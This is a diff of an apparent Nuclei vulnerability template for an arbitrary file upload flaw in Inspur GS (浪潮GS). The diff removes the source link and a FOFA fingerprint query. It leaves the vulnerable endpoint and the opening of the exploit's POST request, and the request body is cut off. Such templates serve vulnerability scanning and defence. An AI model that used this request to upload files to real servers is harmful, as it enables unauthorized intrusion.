@@ -3,12 +3,8 @@ info:
   name: 浪潮GS uploadlistfile 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qcg4tb4ehyptcsg6'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qcg4tb4ehyptcsg6
-    fofa: body="/cwbase/web/gsprtf/"
 http:
 - raw:
   - 'POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
